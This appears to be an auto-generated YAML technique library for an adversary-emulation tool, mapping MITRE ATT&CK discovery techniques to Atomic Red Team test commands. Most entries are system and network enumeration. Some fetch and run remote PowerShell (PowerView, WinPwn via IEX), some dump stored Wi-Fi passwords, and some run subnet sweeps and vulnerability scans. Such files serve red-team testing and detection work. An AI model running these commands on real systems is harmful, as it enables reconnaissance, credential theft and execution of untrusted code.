# AutoStrike MITRE ATT&CK Techniques - discovery
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1007
  name: System Service Discovery
  description: 'Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>. Adversaries may also gather information about schedule tasks via commands such as `schtasks` on Windows or `crontab -l` on Linux and macOS.(Citation: Elastic Security Labs GOSAR 2024)(Citation: Senti...'
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: System Service Discovery
      type: cmd
      platform: windows
      command: |-
        tasklist.exe /svc
        sc query
        sc query state= all
      timeout: 120
      elevation_required: true
    - name: System Service Discovery - net.exe
      type: cmd
      platform: windows
      command: net.exe start >> %temp%\service-list.txt
      cleanup: del /f /q /s %temp%\service-list.txt >nul 2>&1
      timeout: 120
    - name: System Service Discovery - systemctl/service
      type: bash
      platform: linux
      command: if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
      timeout: 60
    - name: Get-Service Execution
      type: cmd
      platform: windows
      command: powershell.exe Get-Service
      timeout: 120
    - name: System Service Discovery - macOS launchctl
      type: sh
      platform: macos
      command: launchctl list
      timeout: 60
    - name: System Service Discovery - Windows Scheduled Tasks (schtasks)
      type: cmd
      platform: windows
      command: schtasks /query /fo LIST /v
      timeout: 120
    - name: System Service Discovery - Services Registry Enumeration
      type: powershell
      platform: windows
      command: |-
        Get-ChildItem -Path 'HKLM:\SYSTEM\CurrentControlSet\Services' |
          ForEach-Object {
            $p = Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue
            [PSCustomObject]@{
              Name        = $_.PSChildName
              DisplayName = $p.DisplayName
              ImagePath   = $p.ImagePath
              StartType   = $p.Start
            }
          }
      timeout: 120
    - name: System Service Discovery - Linux init scripts
      type: sh
      platform: linux
      command: |-
        echo "[*] Listing SysV init scripts (/etc/init.d):"
        if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo "/etc/init.d not present on this system"; fi
        echo
        echo "[*] Listing runlevel directories (/etc/rc*.d):"
        ls -ld /etc/rc*.d 2>/dev/null || echo "No /etc/rc*.d directories found"
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1007
  is_safe: false
- id: T1010
  name: Application Window Discovery
  description: |-
    Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)

    Adversaries typically abuse system features for th...
  tactic: discovery
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: List Process Main Windows - C# .NET
      type: cmd
      platform: windows
      command: |-
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "PathToAtomicsFolder\T1010\src\T1010.cs"
        %TEMP%\T1010.exe
      cleanup: del /f /q /s %TEMP%\T1010.exe >nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1010
  is_safe: false
- id: T1012
  name: Query Registry
  description: |-
    Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

    The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further t...
  tactic: discovery
  platforms:
    - windows
  executors:
    - name: Query Registry
      type: cmd
      platform: windows
      command: |-
        reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
        reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
        reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
        reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
        reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
        reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
        reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
        reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
        reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
        reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
        reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"
        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
        reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
        reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components"
        reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup"
      timeout: 120
      elevation_required: true
    - name: Query Registry with Powershell cmdlets
      type: powershell
      platform: windows
      command: "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\" \nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\""
      timeout: 120
      elevation_required: true
    - name: Enumerate COM Objects in Registry with Powershell
      type: powershell
      platform: windows
      command: |-
        New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
        Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > $env:temp\clsids.txt
        ForEach($CLSID in Get-Content "$env:temp\clsids.txt")
        {try{write-output "$($Position)-$($CLSID)"
        write-output "------------"| out-file $env:temp\T1592.002Test1.txt -append
        write-output $($CLSID)| out-file $env:temp\T1592.002Test1.txt -append
        $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
        $handle | get-member -erroraction silentlycontinue | out-file $env:temp\T1592.002Test1.txt -append
        $position += 1} catch{}}
      cleanup: |-
        remove-item $env:temp\T1592.002Test1.txt -force -erroraction silentlycontinue
        remove-item $env:temp\clsids.txt -force -erroraction silentlycontinue
      timeout: 120
    - name: Reg query for AlwaysInstallElevated status
      type: cmd
      platform: windows
      command: |-
        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
      timeout: 120
      elevation_required: true
    - name: Check Software Inventory Logging (SIL) status via Registry
      type: cmd
      platform: windows
      command: reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
      timeout: 120
      elevation_required: true
    - name: Inspect SystemStartOptions Value in Registry
      type: cmd
      platform: windows
      command: reg.exe query HKLM\SYSTEM\CurrentControlSet\Control /v SystemStartOptions
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1012
  is_safe: false
- id: T1016
  name: System Network Configuration Discovery
  description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/softwar...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: System Network Configuration Discovery on Windows
      type: cmd
      platform: windows
      command: |-
        ipconfig /all
        netsh interface show interface
        arp -a
        nbtstat -n
        net config
      timeout: 120
    - name: List Windows Firewall Rules
      type: cmd
      platform: windows
      command: netsh advfirewall firewall show rule name=all
      timeout: 120
    - name: System Network Configuration Discovery
      type: sh
      platform: macos
      command: |-
        if [ "$(uname)" = 'FreeBSD' ]; then cmd="netstat -Sp tcp"; else cmd="netstat -ant"; fi;
        if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v netstat)" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
      timeout: 60
    - name: System Network Configuration Discovery
      type: sh
      platform: linux
      command: |-
        if [ "$(uname)" = 'FreeBSD' ]; then cmd="netstat -Sp tcp"; else cmd="netstat -ant"; fi;
        if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;
        if [ -x "$(command -v netstat)" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
      timeout: 60
    - name: System Network Configuration Discovery (TrickBot Style)
      type: cmd
      platform: windows
      command: |-
        ipconfig /all
        net config workstation
        net view /all /domain
        nltest /domain_trusts
      timeout: 120
    - name: List Open Egress Ports
      type: powershell
      platform: windows
      command: "$ports = Get-content \"PathToAtomicsFolder\\T1016\\src\\top-128.txt\"\n$file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results"
      cleanup: Remove-Item -ErrorAction ignore "$env:USERPROFILE\Desktop\open-ports.txt"
      timeout: 120
    - name: Adfind - Enumerate Active Directory Subnet Objects
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=subnet)'
      timeout: 120
    - name: Qakbot Recon
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\T1016\src\qakbot.bat"'
      timeout: 120
    - name: List macOS Firewall Rules
      type: bash
      platform: macos
      command: |-
        sudo defaults read /Library/Preferences/com.apple.alf
        sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
      timeout: 60
      elevation_required: true
    - name: DNS Server Discovery Using nslookup
      type: cmd
      platform: windows
      command: nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1016
  is_safe: false
- id: T1016.001
  name: Internet Connection Discovery
  description: |-
    Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites, or performing initial speed testing to confirm bandwidth.

    Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to ...
  tactic: discovery
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: Check internet connection using ping Windows
      type: cmd
      platform: windows
      command: ping -n 4 8.8.8.8
      timeout: 120
    - name: Check internet connection using ping freebsd, linux or macos
      type: bash
      platform: macos
      command: ping -c 4 8.8.8.8
      timeout: 60
    - name: Check internet connection using ping freebsd, linux or macos
      type: bash
      platform: linux
      command: ping -c 4 8.8.8.8
      timeout: 60
    - name: Check internet connection using Test-NetConnection in PowerShell (ICMP-Ping)
      type: powershell
      platform: windows
      command: Test-NetConnection -ComputerName 8.8.8.8
      timeout: 120
    - name: Check internet connection using Test-NetConnection in PowerShell (TCP-HTTP)
      type: powershell
      platform: windows
      command: Test-NetConnection -CommonTCPPort HTTP -ComputerName www.google.com
      timeout: 120
    - name: Check internet connection using Test-NetConnection in PowerShell (TCP-SMB)
      type: powershell
      platform: windows
      command: Test-NetConnection -CommonTCPPort SMB -ComputerName 8.8.8.8
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1016/001
  is_safe: true
- id: T1016.002
  name: Wi-Fi Discovery
  description: |-
    Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087), [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006) activity to support both ongoing and future campaigns.

    Adversaries may collect various types of information ab...
  tactic: discovery
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Enumerate Stored Wi-Fi Profiles And Passwords via netsh
      type: cmd
      platform: windows
      command: netsh wlan show profile * key=clear
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1016/002
  is_safe: true
- id: T1018
  name: Remote System Discovery
  description: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097), <code>net view</code> using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag p...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Remote System Discovery - net
      type: cmd
      platform: windows
      command: |-
        net view /domain
        net view
      timeout: 120
    - name: Remote System Discovery - net group Domain Computers
      type: cmd
      platform: windows
      command: net group "Domain Computers" /domain
      timeout: 120
    - name: Remote System Discovery - nltest
      type: cmd
      platform: windows
      command: nltest.exe /dclist:%userdnsdomain%
      timeout: 120
    - name: Remote System Discovery - ping sweep
      type: cmd
      platform: windows
      command: for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i
      timeout: 120
    - name: Remote System Discovery - arp
      type: cmd
      platform: windows
      command: arp -a
      timeout: 120
    - name: Remote System Discovery - arp nix
      type: sh
      platform: linux
      command: arp -a | grep -v '^?'
      timeout: 60
    - name: Remote System Discovery - arp nix
      type: sh
      platform: macos
      command: arp -a | grep -v '^?'
      timeout: 60
    - name: Remote System Discovery - sweep
      type: sh
      platform: linux
      command: 'for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo "192.168.1.$ip UP" || : ; done'
      timeout: 60
    - name: Remote System Discovery - sweep
      type: sh
      platform: macos
      command: 'for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo "192.168.1.$ip UP" || : ; done'
      timeout: 60
    - name: Remote System Discovery - nslookup
      type: powershell
      platform: windows
      command: |-
        $localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
        $pieces = $localip.split(".")
        $firstOctet = $pieces[0]
        $secondOctet = $pieces[1]
        $thirdOctet = $pieces[2]
        foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}
      timeout: 120
      elevation_required: true
    - name: Remote System Discovery - adidnsdump
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\venv_t1018\Scripts\adidnsdump" -u domain\user -p password --print-zones 192.168.1.1'
      timeout: 120
      elevation_required: true
    - name: Adfind - Enumerate Active Directory Computer Objects
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=computer)'
      timeout: 120
    - name: Adfind - Enumerate Active Directory Domain Controller Objects
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"  -sc dclist'
      timeout: 120
    - name: Remote System Discovery - ip neighbour
      type: sh
      platform: linux
      command: ip neighbour show
      timeout: 60
    - name: Remote System Discovery - ip route
      type: sh
      platform: linux
      command: ip route show
      timeout: 60
    - name: Remote System Discovery - netstat
      type: sh
      platform: linux
      command: netstat -r | grep default
      timeout: 60
    - name: Remote System Discovery - ip tcp_metrics
      type: sh
      platform: linux
      command: ip tcp_metrics show |grep --invert-match "^127\."
      timeout: 60
    - name: Enumerate domain computers within Active Directory using DirectorySearcher
      type: powershell
      platform: windows
      command: |-
        $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)")
        $DirectorySearcher.PropertiesToLoad.Add("Name")
        $Computers = $DirectorySearcher.findall()
        foreach ($Computer in $Computers) {
          $Computer = $Computer.Properties.name
          if (!$Computer) { Continue }
          Write-Host $Computer}
      timeout: 120
    - name: Enumerate Active Directory Computers with Get-AdComputer
      type: powershell
      platform: windows
      command: Get-AdComputer -Filter *
      timeout: 120
    - name: Enumerate Active Directory Computers with ADSISearcher
      type: powershell
      platform: windows
      command: ([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()
      timeout: 120
    - name: Get-DomainController with PowerView
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
      timeout: 120
    - name: Get-WmiObject to Enumerate Domain Controllers
      type: powershell
      platform: windows
      command: |-
        try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
        catch { $_; exit $_.Exception.HResult }
      timeout: 120
    - name: Remote System Discovery - net group Domain Controller
      type: cmd
      platform: windows
      command: net group /domain "Domain controllers"
      timeout: 120
    - name: Enumerate Remote Hosts with Netscan
      type: powershell
      platform: windows
      command: cmd /c 'PathToAtomicsFolder\..\ExternalPayloads\netscan\64-bit\netscan.exe' /hide /auto:"$env:temp\T1018NetscanOutput.txt" /range:'127.0.0.1-127.0.0.1'
      cleanup: remove-item "$env:temp\T1018NetscanOutput.txt" -force -erroraction silentlycontinue
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1018
  is_safe: false
- id: T1033
  name: System Owner/User Discovery
  description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running pr...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: System Owner/User Discovery
      type: cmd
      platform: windows
      command: |-
        cmd.exe /C whoami
        wmic useraccount get /ALL
        quser /SERVER:"localhost"
        quser
        qwinsta.exe /server:localhost
        qwinsta.exe
        for /F "tokens=1,2" %i in ('qwinsta /server:localhost ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt
        @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
      timeout: 120
    - name: System Owner/User Discovery (2)
      type: sh
      platform: linux
      command: |-
        users
        w
        who
      timeout: 60
    - name: System Owner/User Discovery (2)
      type: sh
      platform: macos
      command: |-
        users
        w
        who
      timeout: 60
    - name: Find computers where user has session - Stealth mode (PowerView)
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
      timeout: 120
    - name: User Discovery With Env Vars PowerShell Script
      type: powershell
      platform: windows
      command: "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append"
      cleanup: Remove-Item -Path .\CurrentactiveUser.txt -Force
      timeout: 120
    - name: GetCurrent User with PowerShell Script
      type: powershell
      platform: windows
      command: '[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt'
      cleanup: Remove-Item -Path .\CurrentUserObject.txt -Force
      timeout: 120
    - name: System Discovery - SocGholish whoami
      type: powershell
      platform: windows
      command: |-
        $TokenSet = @{
          U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
          N = [Char[]]'0123456789'
        }
        $Upper = Get-Random -Count 5 -InputObject $TokenSet.U
        $Number = Get-Random -Count 5 -InputObject $TokenSet.N
        $StringSet = $Upper + $Number
        $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
        $file = "rad" + $rad + ".tmp"

        whoami.exe /all >> $env:temp\$file
      cleanup: Remove-Item -Path $env:temp\rad*.tmp -Force
      timeout: 120
    - name: System Owner/User Discovery Using Command Prompt
      type: cmd
      platform: windows
      command: |-
        set file=$env:temp\user_info_%random%.tmp
        echo Username: %USERNAME% > %file%
        echo User Domain: %USERDOMAIN% >> %file%
        net users >> %file%
        query user >> %file%
      cleanup: del $env:temp\\user_info_*.tmp
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1033
  is_safe: true
- id: T1046
  name: Network Service Discovery
  description: "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the..."
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Port Scan
      type: bash
      platform: linux
      command: for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done
      timeout: 60
    - name: Port Scan
      type: bash
      platform: macos
      command: for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done
      timeout: 60
    - name: Port Scan Nmap
      type: sh
      platform: linux
      command: |-
        sudo nmap -sS 192.168.1.0/24 -p 80
        telnet 192.168.1.1 80
        nc -nv 192.168.1.1 80
      timeout: 60
      elevation_required: true
    - name: Port Scan Nmap
      type: sh
      platform: macos
      command: |-
        sudo nmap -sS 192.168.1.0/24 -p 80
        telnet 192.168.1.1 80
        nc -nv 192.168.1.1 80
      timeout: 60
      elevation_required: true
    - name: Port Scan NMap for Windows
      type: powershell
      platform: windows
      command: nmap 127.0.0.1
      timeout: 120
      elevation_required: true
    - name: Port Scan using python
      type: powershell
      platform: windows
      command: python "PathToAtomicsFolder\T1046\src\T1046.py" -i 127.0.0.1
      timeout: 120
    - name: WinPwn - spoolvulnscan
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        spoolvulnscan -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - MS17-10
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        MS17-10 -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - bluekeep
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        bluekeep -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - fruit
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        fruit -noninteractive -consoleoutput
      timeout: 120
    - name: Port-Scanning /24 Subnet with PowerShell
      type: powershell
      platform: windows
      command: |-
        $ipAddr = ""
        if ($ipAddr -like "*,*") {
            $ip_list = $ipAddr -split ","
            $ip_list = $ip_list.ForEach({ $_.Trim() })
            Write-Host "[i] IP Address List: $ip_list"

            $ports = 445, 3389

            foreach ($ip in $ip_list) {
                foreach ($port in $ports) {
                    Write-Host "[i] Establishing connection to: $ip : $port"
                    try {
                        $tcp = New-Object Net.Sockets.TcpClient
                        $tcp.ConnectAsync($ip, $port).Wait(200) | Out-Null
                    } catch {}
                    if ($tcp.Connected) {
                        $tcp.Close()
                        Write-Host "Port $port is open on $ip"
                    }
                }
            }
        } elseif ($ipAddr -notlike "*,*") {
            if ($ipAddr -eq "") {
                # Assumes the "primary" interface is shown at the top
                $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
                Write-Host "[i] Using Interface $interface"
                $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
            }
            Write-Host "[i] Base IP-Address for Subnet: $ipAddr"
            $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)
            # Always assumes /24 subnet
            Write-Host "[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'"

            $ports = 445, 3389
            $subnetIPs = 1..254 | ForEach-Object { "$subnetSubstring$_" }

            foreach ($ip in $subnetIPs) {
                foreach ($port in $ports) {
                    try {
                        $tcp = New-Object Net.Sockets.TcpClient
                        $tcp.ConnectAsync($ip, $port).Wait(200) | Out-Null
                    } catch {}
                    if ($tcp.Connected) {
                        $tcp.Close()
                        Write-Host "Port $port is open on $ip"
                    }
                }
            }
        } else {
            Write-Host "[Error] Invalid Inputs"
            exit 1
        }
      timeout: 120
    - name: Remote Desktop Services Discovery via PowerShell
      type: powershell
      platform: windows
      command: Get-Service -Name "Remote Desktop Services", "Remote Desktop Configuration"
      timeout: 120
      elevation_required: true
    - name: Port Scan using nmap (Port range)
      type: sh
      platform: linux
      command: nmap -Pn -sV -p 0-65535 127.0.0.1
      timeout: 60
      elevation_required: true
    - name: Port Scan using nmap (Port range)
      type: sh
      platform: macos
      command: nmap -Pn -sV -p 0-65535 127.0.0.1
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1046
  is_safe: false
- id: T1049
  name: System Network Connections Discovery
  description: "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating s..."
  tactic: discovery
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: System Network Connections Discovery
      type: cmd
      platform: windows
      command: |-
        netstat -ano
        net use
        net sessions 2>nul
      timeout: 120
